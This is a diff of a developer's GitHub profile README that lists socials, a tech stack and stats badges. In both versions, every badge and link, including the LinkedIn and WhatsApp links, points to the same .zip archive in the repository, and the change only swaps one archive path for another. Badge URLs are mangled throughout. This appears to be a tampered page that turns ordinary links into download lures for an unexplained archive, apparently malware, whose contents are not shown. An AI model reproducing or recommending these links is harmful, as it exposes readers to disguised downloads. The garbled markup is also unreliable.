@@ -3,56 +3,56 @@
 
 
 ## 🌐 Socials:
-[![LinkedIn](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip)](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip) [![WhatsApp](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip)](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip) 
+[![LinkedIn](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip)](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip) [![WhatsApp](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip)](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip) 
 
 # 💻 Tech Stack:
 🔥**Web Development**🔥<br/>
-![React](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%2361DAFB) 
-![Redux](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip) 
-![React Query](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%20Query-FF4154?style=for-the-badge&logo=react%20query&logoColor=white) 
-![Context-API](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip) 
-![Styled Components](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip) 
-![Semantic UI React](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%20UI%20React-%https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip) 
-![Next JS](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip) 
-![HTML5](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip) 
-![CSS3](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip) 
-![Bootstrap](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip) 
-![TailwindCSS](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip) 
-![JavaScript](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%23F7DF1E) 
-![TypeScript](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip) <br/> <br/>
+![React](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%2361DAFB) 
+![Redux](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip) 
+![React Query](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%20Query-FF4154?style=for-the-badge&logo=react%20query&logoColor=white) 
+![Context-API](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip) 
+![Styled Components](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip) 
+![Semantic UI React](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%20UI%20React-%https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip) 
+![Next JS](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip) 
+![HTML5](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip) 
+![CSS3](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip) 
+![Bootstrap](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip) 
+![TailwindCSS](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip) 
+![JavaScript](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%23F7DF1E) 
+![TypeScript](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip) <br/> <br/>
 🔥**Mobile Development**🔥<br/>
-![React Native](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%2361DAFB) 
-![Expo](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip) <br/><br/>
+![React Native](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%2361DAFB) 
+![Expo](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip) <br/><br/>
 🔥**Backend Development**🔥<br/>
-![NodeJS](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip) 
-![https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%2361DAFB)  <br/><br/>
+![NodeJS](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip) 
+![https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%2361DAFB)  <br/><br/>
 🔥**Databases**🔥<br/>
-![Postgres](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip) 
-![Firebase](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip) 
-![MongoDB](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip) <br/><br/>
+![Postgres](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip) 
+![Firebase](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip) 
+![MongoDB](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip) <br/><br/>
 🔥**Others**🔥<br/>
-![https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip)
-![Insomnia](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip) 
-![Postman](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip)<br/>
-![Docker](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip) 
-![Figma](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip) 
-![C](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip)
-![C++](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip++-%https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%2B%2B&logoColor=white)  <br/>
-![Git](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip) 
-![GitHub](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip) 
-![Bitbucket](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip) 
-![GithubPages](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip%20pages-121013?style=for-the-badge&logo=github&logoColor=white) 
+![https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip)
+![Insomnia](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip) 
+![Postman](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip)<br/>
+![Docker](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip) 
+![Figma](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip) 
+![C](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip)
+![C++](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip++-%https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%2B%2B&logoColor=white)  <br/>
+![Git](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip) 
+![GitHub](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip) 
+![Bitbucket](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip) 
+![GithubPages](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip%20pages-121013?style=for-the-badge&logo=github&logoColor=white) 
 
 # 📊 GitHub Stats:
-![](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip)<br/>
-![](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip)<br/>
-![](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip)
+![](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip)<br/>
+![](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip)<br/>
+![](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip)
 
 ### ✍️ Random Dev Quote
-![](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip)
+![](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip)
 
 ---
-[![](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip)](https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip)
+[![](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip)](https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip)
 
-<!-- Proudly created with GPRM ( https://raw.githubusercontent.com/iamdeepkr/iamdeepkr.github.io/main/extrajudicial/iamdeepkr.github.io.zip ) -->
+<!-- Proudly created with GPRM ( https://github.com/iamdeepkr/iamdeepkr.github.io/raw/refs/heads/main/src/assets/github-io-iamdeepkr-v3.4.zip ) -->
 ****
